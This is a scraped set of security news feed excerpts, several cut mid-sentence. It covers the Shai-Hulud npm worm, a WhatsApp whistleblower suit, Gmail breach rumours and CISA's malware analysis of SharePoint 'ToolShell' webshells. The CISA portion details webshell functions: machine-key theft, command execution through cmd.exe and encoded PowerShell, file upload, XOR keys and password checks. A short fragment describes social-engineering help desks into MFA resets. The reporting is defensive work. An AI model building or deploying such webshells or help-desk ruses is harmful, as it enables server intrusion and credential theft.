&lt;li&gt;&lt;strong&gt;Treat mobile device management (MDM) systems as high-value assets (HVAs)&lt;/strong&gt; with additional restrictions and monitoring. MDM systems provide elevated access to thousands of hosts and should be treated as HVAs with additional restrictions and monitoring.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Follow best cybersecurity practices in production and enterprise environments&lt;/strong&gt;, including mandating phishing-resistant multifactor authentication (MFA) for all staff and services. For additional best practices, see CISA’s &lt;a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals" title="Cross-Sector Cybersecurity Performance Goals (CPGs)"&gt;Cross-Sector Cybersecurity Performance Goals (CPGs)&lt;/a&gt;.&lt;/li&gt;

&lt;div class="wp-caption aligncenter" id="attachment_72194" style="width: 714px;"&gt;&lt;img alt="" class=" wp-image-72194" height="619" src="https://krebsonsecurity.com/wp-content/uploads/2025/09/shai-hulud.png" width="704" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72194"&gt;Image: https://en.wikipedia.org/wiki/Sandworm_(Dune)&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;The novel malware strain is being dubbed &lt;strong&gt;Shai-Hulud&lt;/strong&gt; &amp;#8212; after the name for the giant sandworms in Frank Herbert&amp;#8217;s &lt;em&gt;Dune&lt;/em&gt; novel series &amp;#8212; because it publishes any stolen credentials in a new public GitHub repository that includes the name &amp;#8220;Shai-Hulud.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;When a developer installs a compromised package, the malware will look for a npm token in the environment,&amp;#8221; said &lt;strong&gt;Charlie Eriksen&lt;/strong&gt;, a researcher for the Belgian security firm &lt;a href="https://www.aikido.dev/blog/s1ngularity-nx-attackers-strike-again" rel="noopener" target="_blank"&gt;Aikido&lt;/a&gt;. &amp;#8220;If it finds it, it will modify the 20 most popular packages that the npm token has access to, copying itself into the package, and publishing a new version.&amp;#8221;&lt;/p&gt;
&lt;p&gt;At the center of this developing maelstrom are code libraries available on &lt;a href="https://www.npmjs.com/" rel="noopener" target="_blank"&gt;&lt;strong&gt;NPM&lt;/strong&gt;&lt;/a&gt; (short for “Node Package Manager”), which acts as a central hub for JavaScript development and provides the latest updates to widely-used JavaScript components.&lt;/p&gt;
&lt;p&gt;The Shai-Hulud worm emerged just days after unknown attackers &lt;a href="https://krebsonsecurity.com/2025/09/18-popular-code-packages-hacked-rigged-to-steal-crypto/" rel="noopener" target="_blank"&gt;launched a broad phishing campaign&lt;/a&gt; that spoofed NPM and asked developers to &amp;#8220;update&amp;#8221; their multi-factor authentication login options. That attack led to malware being inserted into at least two-dozen NPM code packages, but the outbreak was quickly contained and was narrowly focused on siphoning cryptocurrency payments.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72195" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-72195" height="440" src="https://krebsonsecurity.com/wp-content/uploads/2025/09/shai-hulud-packages.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72195"&gt;Image: aikido.dev&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;In late August, another compromise of an NPM developer resulted in malware being added to &amp;#8220;&lt;strong&gt;nx&lt;/strong&gt;,&amp;#8221; an open-source code development toolkit with as many as six million weekly downloads. In the nx compromise, the attackers introduced code that scoured the user’s device for authentication tokens from programmer destinations like GitHub and NPM, as well as SSH and API keys. But instead of sending those stolen credentials to a central server controlled by the attackers, the malicious nx code created a new public repository in the victim’s GitHub account, and published the stolen data there for all the world to see and download.&lt;/p&gt;
&lt;p&gt;Last month&amp;#8217;s attack on nx did not self-propagate like a worm, but this Shai-Hulud malware does and bundles reconnaissance tools to assist in its spread. Namely, it uses the open-source tool &lt;a href="https://github.com/trufflesecurity/trufflehog" rel="noopener" target="_blank"&gt;TruffleHog&lt;/a&gt; to search for exposed credentials and access tokens on the developer&amp;#8217;s machine. It then attempts to create new GitHub actions and publish any stolen secrets.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Once the first person got compromised, there was no stopping it,&amp;#8221; Aikido&amp;#8217;s Eriksen told KrebsOnSecurity. He said the first NPM package compromised by this worm appears to have been altered on Sept. 14, around 17:58 UTC.&lt;/p&gt;
&lt;p&gt;The security-focused code development platform &lt;strong&gt;socket.dev&lt;/strong&gt; &lt;a href="https://socket.dev/blog/ongoing-supply-chain-attack-targets-crowdstrike-npm-packages" rel="noopener" target="_blank"&gt;reports&lt;/a&gt; the Shai-Halud attack briefly compromised at least 25 NPM code packages managed by CrowdStrike. Socket.dev said the affected packages were quickly removed by the NPM registry.&lt;/p&gt;
&lt;p&gt;In a written statement shared with KrebsOnSecurity, CrowdStrike said that after detecting several malicious packages in the public NPM registry, the company swiftly removed them and rotated its keys in public registries.&lt;/p&gt;
&lt;p&gt;&amp;#8220;These packages are not used in the Falcon sensor, the platform is not impacted and customers remain protected,&amp;#8221; the statement reads, referring to the company&amp;#8217;s widely-used endpoint threat detection service. &amp;#8220;We are working with NPM and conducting a thorough investigation.&amp;#8221;&lt;span id="more-72190"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;A &lt;a href="https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised" rel="noopener" target="_blank"&gt;writeup on the attack&lt;/a&gt; from &lt;strong&gt;StepSecurity&lt;/strong&gt; found that for cloud-specific operations, the malware enumerates AWS, Azure and Google Cloud Platform secrets. It also found the entire attack design assumes the victim is working in a Linux or macOS environment, and that it deliberately skips Windows systems.&lt;/p&gt;
&lt;p&gt;StepSecurity said Shai-Hulud spreads by using stolen NPM authentication tokens, adding its code to the top 20 packages in the victim&amp;#8217;s account.&lt;/p&gt;
&lt;p&gt;&amp;#8220;This creates a cascading effect where an infected package leads to compromised maintainer credentials, which in turn infects all other packages maintained by that user,&amp;#8221; StepSecurity&amp;#8217;s &lt;strong&gt;Ashish Kurmi&lt;/strong&gt; wrote.&lt;/p&gt;
&lt;p&gt;Eriksen said Shai-Hulud is still propagating, although its spread seems to have waned in recent hours.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I still see package versions popping up once in a while, but no new packages have been compromised in the last ~6 hours,&amp;#8221; Eriksen said. &amp;#8220;But that could change now as the east coast starts working. I would think of this attack as a &amp;#8216;living&amp;#8217; thing almost, like a virus. Because it can lay dormant for a while, and if just one person is suddenly infected by accident, they could restart the spread. Especially if there&amp;#8217;s a super-spreader attack.&amp;#8221;&lt;/p&gt;
&lt;p&gt;For now, it appears that the web address the attackers were using to exfiltrate collected data was disabled due to rate limits, Eriksen said.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Nicholas Weaver&lt;/strong&gt; is a researcher with the &lt;strong&gt;International Computer Science Institute&lt;/strong&gt;, a nonprofit in Berkeley, Calif. Weaver called the Shai-Hulud worm &amp;#8220;a supply chain attack that conducts a supply chain attack.&amp;#8221; Weaver said NPM (and all other similar package repositories) need to immediately switch to a publication model that requires explicit human consent for every publication request using a phish-proof 2FA method.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Anything less means attacks like this are going to continue and become far more common, but switching to a 2FA method would effectively throttle these attacks before they can spread,&amp;#8221; Weaver said. &amp;#8220;Allowing purely automated processes to update the published packages is now a proven recipe for disaster.&amp;#8221;&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=72190</guid><category>Latest Warnings</category><category>The Coming Storm</category><category>Time to Patch</category><category>Web Fraud 2.0</category><category>Aikido</category><category>Ashish Kurmi</category><category>Charlie Eriksen</category><category>GitHub</category><category>International Computer Science Institute</category><category>Nicholas Weaver</category><category>NPM</category><category>Shai-Hulud worm</category><category>StepSecurity</category></item><item><title>Former WhatsApp security boss in lawsuit likens Meta’s culture to a “cult”</title><link>https://arstechnica.com/security/2025/09/former-whatsapp-security-boss-sues-meta-for-systemic-cybersecurity-failures/</link><description>Meta allegedly prioritized user growth over security, lawsuit said.</description><content:encoded>&lt;p&gt;Over the past year, Meta has blanketed TV screens around the world with commercials touting the privacy of Whatsapp, its encrypted messenger with a monthly user base of 3 billion people.&lt;/p&gt;
&lt;p&gt;“It’s private,” one &lt;a href="https://arstechnica.com/tag/security/feed/link"&gt;ad&lt;/a&gt; campaign featuring the former cast of the &lt;em&gt;Modern Family&lt;/em&gt; TV show says. “On Whatsapp, no one can see or hear your personal messages … not even us,” a different series of ads declares.&lt;/p&gt;
&lt;h2&gt;“Serious risks to user data”&lt;/h2&gt;
&lt;p&gt;On Monday, the former head of security for the Meta-owed messaging app filed a federal whistleblower lawsuit that tells a far different narrative. The suit, filed in US District Court for the District of Northern California, recites a litany of purported security and privacy flaws that Meta not only didn’t fix after becoming aware of them, but also kept secret, allegedly in violation of a &lt;a href="https://arstechnica.com/tech-policy/2019/07/ftc-fines-facebook-5-billion-imposes-new-privacy-oversight/"&gt;$5 billion settlement&lt;/a&gt; then-Whatsapp parent company Facebook reached with the Federal Trade Commission. The complaint was filed by Attaullah Baig, who became head of WhatsApp security in 2021.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/09/former-whatsapp-security-boss-sues-meta-for-systemic-cybersecurity-failures/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

Or has it? Reports circulated last week claiming that Gmail was the subject of a major data breach, citing a series of warnings Google has distributed and increasing reports of phishing attacks. The hysteria was short-lived, though. In a brief post on its official blog, &lt;a href="https://blog.google/products/workspace/gmail-security-protections/"&gt;Google says&lt;/a&gt; that Gmail’s security is “strong and effective,” and reports to the contrary are mistaken.&lt;/p&gt;
&lt;p&gt;This story seems to have developed due to a random confluence of security events. Google experienced a Gmail data breach in June, but the attack was limited to the company’s corporate Salesforce server. The hacker was able to access publicly available information like business names and contact details, but no private information was compromised.&lt;/p&gt;
&lt;p&gt;Over the following weeks, Google alerted Gmail users to an increase in phishing attacks in July and August. It didn’t offer many details, but many believed the spike in phishing was related to the corporate server breach. Indeed, more people are talking about hacking attempts on social media right now. This led to the claim that Gmail’s entire user base of 2.5 billion people was about to be hacked at any moment, with some reports advising everyone to change their passwords and enable two-factor authentication. While that’s generally good security advice, Google says the truth is much less dramatic.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/gadgets/2025/09/google-says-reports-of-massive-gmail-data-breach-are-entirely-false/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;div class="cma-section"&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA received six files related to Microsoft SharePoint vulnerabilities: CVE-2025-49704 [CWE-94: Code Injection], CVE-2025-49706 [CWE-287: Improper Authentication], CVE-2025-53770 [CWE-502: Deserialization of Trusted Data], and CVE-2025-53771 [CWE-287: Improper Authentication]. According to Microsoft, cyber threat actors have chained CVE-2025-49706 (a network spoofing vulnerability) and CVE-2025-49704 (a remote code execution (RCE) vulnerability) in an exploit chain known as “ToolShell” to gain unauthorized access to on-premise SharePoint servers. Microsoft has not confirmed exploitation of CVE-2025-53771; however, CISA assesses exploitation is likely because it can be chained with CVE-2025-53770 to bypass previously disclosed vulnerabilities CVE-2025-49704 and&amp;nbsp;&lt;br /&gt;CVE-2025-49706.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The analysis includes two Base64 encoded .NET Dynamic-link Library (DLL) binaries and four Active Server Page Extended [ASPX] files. The decoded DLLs are designed to retrieve machine key settings within an ASP[.]NET application's configuration and add the retrieved machine key values to the Hypertext Transfer Protocol (HTTP) response header.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The first ASPX file is used to retrieve and output machine key information from an ASP[.]NET application’s configuration. The next ASPX file contains a command-line instruction used to execute a PowerShell command. The PowerShell command is designed to Base64 decode and install a malicious ASPX webshell on disk. The webshell is used to handle various web-related operations, including setting and retrieving HTTP cookies, command execution and uploading files. The remaining two ASPX webshells are used to execute a command using PowerShell on the server.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;CISA encourages organizations to use the indicators of compromise (IOCs) and detection signatures in this Malware Analysis Report to identify malware samples. For more information on these CVEs, see CISA Alert &lt;a href="https://www.cisa.gov/news-events/alerts/2025/07/20/update-microsoft-releases-guidance-exploitation-sharepoint-vulnerabilities"&gt;Microsoft Releases Guidance on Exploitation of SharePoint Vulnerabilities&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 64-bit .NET DLL that contains a class named "E" (Figure 2) used to extract and concatenate machine key configuration settings within an ASP[.]NET application's configuration. The file uses reflection to access the "MachineKeySection" from the "System.Web" assembly, which contains cryptographic keys used for validation and decryption in ASP[.]NET. The file uses reflection to get and invoke the "GetApplicationConfig" method of the "MachineKeySection" class to retrieve the "machineKey" configuration, which holds the actual key values. The file constructs a string containing the "ValidationKey", "Validation", "DecryptionKey", "Decryption", and "CompatibilityMode" properties of the "machineKeySection" and adds it as a custom header named "X-TXT-NET" to the HTTP response.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 32-bit .NET DLL that contains a class named "E" (Figure 3) used to retrieve system and environment information, along with the machine key configuration settings (Figure 3). This class file is designed to iterate through and collect environment variables as well as retrieve and format .NET and system properties below:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;--Begin System Properties--&amp;nbsp;&lt;br /&gt;Number of logical drives&amp;nbsp;&lt;br /&gt;Drive letters&amp;nbsp;&lt;br /&gt;Computer name&amp;nbsp;&lt;br /&gt;Full path of the system directory&amp;nbsp;&lt;br /&gt;Current directory&amp;nbsp;&lt;br /&gt;Processor count&amp;nbsp;&lt;br /&gt;System uptime (milliseconds since start)&amp;nbsp;&lt;br /&gt;Username&amp;nbsp;&lt;br /&gt;Operating system version&amp;nbsp;&lt;br /&gt;.NET version&amp;nbsp;&lt;br /&gt;--End System Properties--&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The file uses reflection to access the "MachineKeySection" from the "System.Web" assembly, which contains cryptographic keys used for validation and decryption in ASP[.]NET. The file uses reflection to invoke the "GetApplicationConfig" method of the "MachineKeySection" class to retrieve the "machineKey" configuration, which holds the actual key values. The file constructs a string containing the "ValidationKey", "Validation", "DecryptionKey", "Decryption", and "CompatibilityMode" properties of the "machineKeySection". The gathered information and the "MachineKeySection" details are formatted into a string before written to the HTTP response (current.Response object).&lt;/p&gt;

&lt;p&gt;This artifact is a malicious ASPX file used to retrieve and output machine key information from the "MachineKeySection" of the System[.]Web[.]Configuration namespace (Figure 4). This file uses reflection to dynamically load the "System.Web" assembly and access the "MachineKeySection" class within "System.Web.Configuration". The file invokes "GetApplicationConfig" to retrieve the "MachineKeySection" object and writes its properties including, ValidationKey, Validation, DecryptionKey, Decryption, and CompatibilityMode to the HTTP response using the "Response.Write()" method.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a malicious ASP[.]NET web page (.aspx) that contains ASP[.]NET code embedded within an HTML structure. This file is a webshell installed by "info3.aspx" (9340bf73782....). The file handles various operations based on submitted form data or HTTP cookies. The file contains HTML code used to create forms. The forms allow the Threat Actor (TA) to enter a password and submit it using a "Login" button, enter a command into a text field, which can then be executed by clicking an "Execute" button, and upload files that includes two input fields: one for selecting a file (type="file") and another for text input (type="text") (Figure 7).&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The password form element is configured for POST method and the input field is named "nYOmkVTYH2". If the HTML form with a password is received from the TA via an HTTP POST request, the file checks if the submission form field parameter named "nYOmkVTYH2" is not null or empty. If the parameter is present and not empty, the file sets an HTTP Cookie named "wY1DC6wH4u" with a value from the form field "nYOmkVTYH2" and sets the HTTP Cookie expiration date to four days from the current time. This cookie is then added to the response. The file verifies if the HTTP cookie exists in the current HTTP request. If the cookie exists, its value is concatenated with a long hard-coded string "D&amp;amp;Fri2k&amp;amp;x5dMISTnaFq@ssyKk@rEM!98KzSKWpL4Nc8NvaA9AKdJVOtfdJ45FvbyYHxTql6kkc%qOZevc*hu^M#l#LrlNo9!7KLf". This combined string is then hashed using SHA512. The computed hash is converted to a Base64 string and compared against a predefined Base64 encoded string "9gYs0W/reXzR+KO6J/zP6naMU9AQwZCwhmXuPyGeY2VwMkxNGBZaJQAxGS6GvQZJLSAPk8LT0PgJVU1kQQJd2zW9w==" (Figure 6). This process determines whether a user or request is authorized.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The command form element is configured for POST method and the input field is named "GTaRkhJ9wz". If the HTML form with a command is received from the TA via an HTTP POST request, the file checks if the submission form field parameter named "GTaRkhJ9wz" is not null or empty. If the parameter is present and not empty, the file creates a new process to execute a command-line utility "cmd.exe". The file redirects standard input, output, and error streams to capture the results of the executed command. The code writes the value of the "GTaRkhJ9wz" form parameter to the process's standard input, executing the value as a command, and then writes "exit" to terminate the process (Figure 6).&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The file upload form element is configured for POST method and "enctype"="multipart/form-data" to handle file uploads. It includes an input type="file" for selecting a file (input field named "0z3H8H8ato") and an input type="text" for providing a destination path or filename ( input field named "7KAjlfecWF"). If the HTML form for file upload is received from the TA, the file checks if the submission form field parameter named "7KAjlfecWF" (intended to be the file path or name) is not null or empty. The file retrieves the uploaded file through the "0z3H8H8atO" input using "HttpContext.Current[.]Request[.]Files["Oz3H8H8ato"]". If the file exists and has content (content length is greater than zero), the file saves the uploaded file using the path provided in the "7KAjlfecWF" field. Upon successful upload, the "InnerText" of an element named "Result" is set to "uploaded", indicating the file has been saved. If an error occurs during the process, the file captures the exception and displays its details in "Result.InnerText" (Figure 6). The file displays server-side generated output or messages to the TA.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a malicious ASPX file with a "Page_Load" event handler that constructs and executes a command using PowerShell on the server (Figure 8). Upon execution, the file takes a Base64-encoded string from a form parameter named "p". The Base64 encoded string is decoded and Exclusively-OR (XOR) decrypted using a hard-coded XOR key "68901a394a76dc5064fba96b862665ee596b1a1468bdc618157d7cca0130902e". The output of the XOR decrypted bytes are converted to a Unicode Transformation Format-8 (UTF-8) string and then Base64 encoded. The Base64 encoded string is passed as an argument to the PowerShell process "powershell.exe" using the "-EncodedCommand flag". The file redirects the standard output of the PowerShell process and reads it into a variable "o", which is then written back to the HTTP response.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a malicious ASPX file with a "Page_Load" event handler that constructs and executes a command using PowerShell on the server (Figure 9). Upon execution, the file constructs a PowerShell command that decodes a Base64 string from the request form parameter "p". The decoded string is decrypted using the XOR function with the hard-coded key "a859f0208777462899df67b3d81a7b8b". The decrypted bytes (command) is executed using a PowerShell command. The standard output of the executed PowerShell command is converted to a UTF-8 string, then encrypted using the XOR function with the same hard-coded key. The encrypted bytes data is Base64 encoded before written to the HTTP response using "Response.Write".&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;div class="cma-section"&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Other times, you just call up a company’s IT service desk and pretend to be an employee who needs a password reset, an Okta multifactor authentication reset, and a Microsoft multifactor authentication reset… and it’s done. Without even verifying your identity.&lt;/p&gt;
&lt;p&gt;So you use that information to log in to the target network and discover a more trusted user who works in IT security.

What could go wrong?</description><content:encoded>&lt;p&gt;Extensions installed on almost 1 million devices have been overriding key security protections to turn browsers into engines that scrape websites on behalf of a paid service, a researcher said.&lt;/p&gt;
&lt;p&gt;The 245 extensions, available for Chrome, Firefox, and Edge, have racked up nearly 909,000 downloads, John Tuckner of SecurityAnnex &lt;a href="https://secureannex.com/blog/mellow-drama/"&gt;reported&lt;/a&gt;. The extensions serve a wide range of purposes, including managing bookmarks and clipboards, boosting speaker volumes, and generating random numbers. The common thread among all of them: They incorporate &lt;a href="https://github.com/mellowtel-inc/mellowtel-js"&gt;MellowTel-js&lt;/a&gt;, an open source JavaScript library that allows developers to monetize their extensions.&lt;/p&gt;
&lt;h2&gt;Intentional weakening of browsing protections&lt;/h2&gt;
&lt;p&gt;Tuckner and critics say the monetization works by using the browser extensions to scrape websites on behalf of paying customers, which include AI startups, according to MellowTel founder Arsian Ali. Tuckner reached this conclusion after uncovering close ties between MellowTel and &lt;a href="https://www.olostep.com/"&gt;Olostep&lt;/a&gt;, a company that bills itself as “the world’s most reliable and cost-effective Web scraping API.” Olostep says its service “avoids all bot detection and can parallelize up to 100K requests in minutes.” Paying customers submit the locations of browsers they want to access specific webpages. Olostep then uses its installed base of extension users to fulfill the request.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/07/browser-extensions-turn-nearly-1-million-browsers-into-website-scraping-bots/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

Users who don’t want their previous settings to be overridden may have to take action.&lt;/p&gt;
&lt;p&gt;An email Google sent recently informing users of the change linked to a &lt;a href="https://support.google.com/gemini/answer/13594961?hl=en&amp;amp;visit_id=638842317183560022-880737628&amp;amp;p=e_live_data&amp;amp;rd=1#extensions"&gt;notification page&lt;/a&gt; that said that “human reviewers (including service providers) read, annotate, and process” the data Gemini accesses. The email provides no useful guidance for preventing the changes from taking effect. The email said users can block the apps that Gemini interacts with, but even in those cases, data is stored for 72 hours.&lt;/p&gt;

      An email Google recently sent to Android users.
    
&lt;h2&gt;No, Google, it’s &lt;em&gt;not&lt;/em&gt; good news&lt;/h2&gt;
&lt;p&gt;The email never explains how users can fully extricate Gemini from their Android devices and seems to contradict itself on how or whether this is even possible. At one point, it says the changes “will automatically start rolling out” today and will give Gemini access to apps such as WhatsApp, Messages, and Phone “whether your Gemini apps activity is on or off.” A few sentences later, the email says, “If you have already turned these features off, they will remain off.” Nowhere in the email or the support pages it links to are Android users informed how to remove Gemini integrations completely.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/07/unless-users-take-action-android-will-let-gemini-access-third-party-apps/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Before using GameChat on Switch 2 for the first time, you must consent to a set of GameChat Terms displayed on the system itself. These terms warn that chat content is “recorded and stored temporarily” both on your system and the system of those you chat with. But those stored recordings are only shared with Nintendo if a user reports a violation of &lt;a href="https://www.nintendo.com/us/community-guidelines/?srsltid=AfmBOoq-mAHbzdcIN7q8kBPONxq-dm5WM2_fFDG_ec16SRZc0dWkz-Xr"&gt;Nintendo’s Community Guidelines&lt;/a&gt;, the company writes.&lt;/p&gt;
&lt;p&gt;That reporting feature lets a user “review a recording of the last three minutes of the latest three GameChat sessions” to highlight a particular section for review, suggesting that chat sessions are not being captured and stored in full. The terms also lay out that “these recordings are available only if the report is submitted within 24 hours,” suggesting that recordings are deleted from local storage after a full day.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/gaming/2025/06/nintendo-warns-switch-2-gamechat-users-your-chat-is-recorded/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Effective immediately, Signal for Windows will by default block the ability of Windows to screenshot the app. Signal users who want to disable the block—for instance to preserve a conversation for their records or make use of accessibility features for sight-impaired users—will have to change settings inside their desktop version to enable screenshots.&lt;/p&gt;
&lt;h2&gt;My kingdom for an API&lt;/h2&gt;
&lt;p&gt;“Although Microsoft made several adjustments over the past twelve months in response to critical feedback, the revamped version of Recall still places any content that’s displayed within privacy-preserving apps like Signal at risk,” Signal officials &lt;a href="https://signal.org/blog/signal-doesnt-recall/"&gt;wrote Wednesday&lt;/a&gt;. “As a result, we are enabling an extra layer of protection by default on Windows 11 in order to help maintain the security of Signal Desktop on that platform even though it introduces some usability trade-offs.

&lt;p&gt;On Tuesday, the company &lt;a href="https://security.googleblog.com/2025/05/advanced-protection-mobile-devices.html"&gt;unveiled&lt;/a&gt; the Advanced Protection mode, most of which will be rolled out in the upcoming release of Android 16. The setting comes as mercenary malware sold by &lt;a href="https://arstechnica.com/security/2025/05/jury-orders-nso-to-pay-167-million-for-hacking-whatsapp-users/"&gt;NSO Group&lt;/a&gt; and a cottage industry of other exploit sellers continues to thrive. These players provide attacks-as-a-service through end-to-end platforms that exploit zero-day vulnerabilities on targeted devices, infect them with advanced spyware, and then capture contacts, message histories, locations, and other sensitive information. Over the past decade, phones running fully updated versions of Android and iOS have routinely been hacked through these services.&lt;/p&gt;
&lt;h2&gt;A core suite of enhanced security features&lt;/h2&gt;
&lt;p&gt;Advanced Protection is Google’s latest answer to this type of attack. By flipping a single button in device settings, users can enable a host of protections that can thwart some of the most common techniques used in sophisticated hacks. In some cases, the protections hamper performance and capabilities of the device, so Google is recommending the new mode mainly for journalists, elected officials, and other groups who are most often targeted or have the most to lose when infected.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/05/google-introduces-advanced-protection-mode-for-its-most-at-risk-android-users/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Curl (cURL in some realms), which &lt;a href="https://arstechnica.com/information-technology/2023/03/curl-the-omnipresent-data-tool-is-getting-a-25th-birthday-party-this-month/"&gt;turned 25 years old in 2023&lt;/a&gt;, is an essential command-line tool and library for interacting with Internet resources. The open source project receives bug reports and security issues through many channels, including HackerOne, a reporting service that helps companies manage vulnerability reporting and bug bounties. HackerOne has fervently taken to AI tools in recent years. “One platform, dual force: Human minds + AI power,” &lt;a href="https://www.hackerone.com/"&gt;the firm’s home page reads&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Stenberg, saying that he’s “had it” and is “putting my foot down on this craziness,” suggested that every suspected AI-generated HackerOne report will have its reporter asked to verify if they used AI to find the problem or generate the submission. If a report is deemed “AI slop,” the reporter will be banned. “We still have not seen a single valid security report done with AI help,” Stenberg wrote.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/gadgets/2025/05/open-source-project-curl-is-sick-of-users-submitting-ai-slop-vulnerabilities/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

Through its sprawling network of services and research initiatives, Google is the first to spot many of these threats. In a new report from the Google Threat Intelligence Group (GTIG), the company reveals it detected 75 zero-day &lt;a href="https://arstechnica.com/security/2024/05/google-patches-its-fifth-zero-day-vulnerability-of-the-year-in-chrome/"&gt;exploits in 2024&lt;/a&gt;, which is a bit lower than the previous year. Unsurprisingly, a sizable chunk of them was the work of state-sponsored hackers.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/2024-zero-day-trends"&gt;According to Google&lt;/a&gt;, zero-day exploits are becoming increasingly easy for threat actors to develop and procure, which has led to more sophisticated attacks. While end-user devices are still regularly targeted, GTIG notes that the trend over the past few years has been for these vulnerabilities to target enterprise systems and security infrastructure. There were 98 zero-days detected in 2023 versus 75 in 2024, but Google says the overall trend in enterprise threats is increasing.&lt;/p&gt;
&lt;p&gt;That’s not to say the products you use every day are safe from sneaky hacks—a slim majority of GTIG’s 2024 zero-day threats still targeted users. In fact, Google says hackers were even more interested in certain platforms last year compared to the year before.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/04/google-governments-are-using-zero-day-hacks-more-than-ever/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

Now, researchers are revealing that, for years, the mitigations have suffered from a fundamental defect that has made them trivial to bypass.&lt;/p&gt;
&lt;p&gt;“Juice jacking” was coined in a &lt;a href="https://krebsonsecurity.com/2011/08/beware-of-juice-jacking/" rel="noopener" target="_blank"&gt;2011 article&lt;/a&gt; on KrebsOnSecurity detailing an attack demonstrated at a Defcon security conference at the time. Juice jacking works by equipping a charger with hidden hardware that can access files and other internal resources of phones, in much the same way that a computer can when a user connects it to the phone.&lt;/p&gt;
